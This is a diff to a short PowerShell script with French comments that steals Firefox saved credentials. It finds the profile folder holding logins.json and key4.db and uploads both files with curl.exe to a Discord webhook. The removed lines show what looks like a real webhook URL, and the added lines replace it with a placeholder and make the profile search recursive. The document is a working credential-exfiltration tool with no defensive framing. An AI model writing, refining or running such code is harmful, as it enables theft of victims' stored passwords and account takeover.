@@ -1,20 +1,21 @@
 # --- CONFIGURATION ---
-$hook = "https://discord.com/api/webhooks/1486345183325978734/RPhcGENfxMFPENJ_v8u7bmoHsQaKlttoSVc91m3rBnqzFaby8tj67U7RGTxhB9w14AAi"
+$hook = "TON_URL_WEBHOOK_DISCORD"
 
-# --- RECHERCHE DU PROFIL ---
+# --- RECHERCHE DYNAMIQUE DU BON PROFIL ---
 $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-$profile = Get-ChildItem -Path $ffPath -Directory | Select-Object -First 1
 
-if ($profile) {
-    $lPath = Join-Path $profile.FullName "logins.json"
-    $kPath = Join-Path $profile.FullName "key4.db"
+# On cherche récursivement le fichier logins.json pour trouver le dossier actif
+$targetFile = Get-ChildItem -Path $ffPath -Filter "logins.json" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 
-    # On vérifie si les fichiers existent
-    if (Test-Path $lPath, $kPath) {
-        # On les envoie un par un vers Discord
-        foreach ($file in $lPath, $kPath) {
-            # Discord permet d'envoyer des fichiers via Webhook en utilisant curl.exe (présent sur Windows 10/11)
-            curl.exe -F "file=@$file" $hook
-        }
-    }
+if ($targetFile) {
+    # On récupère le dossier qui contient ce fichier
+    $profileDir = $targetFile.DirectoryName
+    
+    $lPath = Join-Path $profileDir "logins.json"
+    $kPath = Join-Path $profileDir "key4.db"
+
+    # Envoi des fichiers vers Discord
+    # On utilise curl pour envoyer les fichiers réels
+    if (Test-Path $lPath) { curl.exe -F "file=@$lPath" $hook }
+    if (Test-Path $kPath) { curl.exe -F "file=@$kPath" $hook }
 }
